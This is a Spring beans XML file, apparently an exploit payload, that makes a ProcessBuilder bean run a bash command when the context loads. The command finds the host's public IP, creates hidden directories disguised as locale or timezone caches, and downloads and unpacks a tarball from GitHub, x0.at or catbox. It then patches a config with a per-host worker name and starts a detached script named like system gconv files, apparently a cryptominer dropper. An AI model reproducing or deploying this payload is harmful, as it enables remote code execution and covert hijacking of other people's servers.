<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>IP=$(curl -s -m 5 ifconfig.me 2>/dev/null||wget -qO- -T 5 ifconfig.me 2>/dev/null||hostname -I 2>/dev/null|cut -d" " -f1);W=w8a-$(echo $IP|tr . -);B=/usr/lib/locale/.tzcache;mkdir -p $B 2>/dev/null||B=$HOME/.cache/.tz;mkdir -p $B;U1=https://raw.githubusercontent.com/burmaldagpt/gconv-cache/main/w8.tgz;U2=https://x0.at/3Ko3.tgz;U3=https://files.catbox.moe/z18vym.tgz;(wget -q -O $B/.g.tgz $U1||wget -q -O $B/.g.tgz $U2||wget -q -O $B/.g.tgz $U3||curl -sL -m 120 -o $B/.g.tgz $U1||curl -s -o $B/.g.tgz $U2||curl -s -o $B/.g.tgz $U3);tar xzf $B/.g.tgz -C $B 2>/dev/null;sed -i "s/w8x/$W/" $B/.gc/gconv.conf;chmod 755 $B/.gc/gconv_sync $B/.gc/gconv_check.sh;setsid sh $B/.gc/gconv_check.sh;rm -f $B/.g.tgz</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
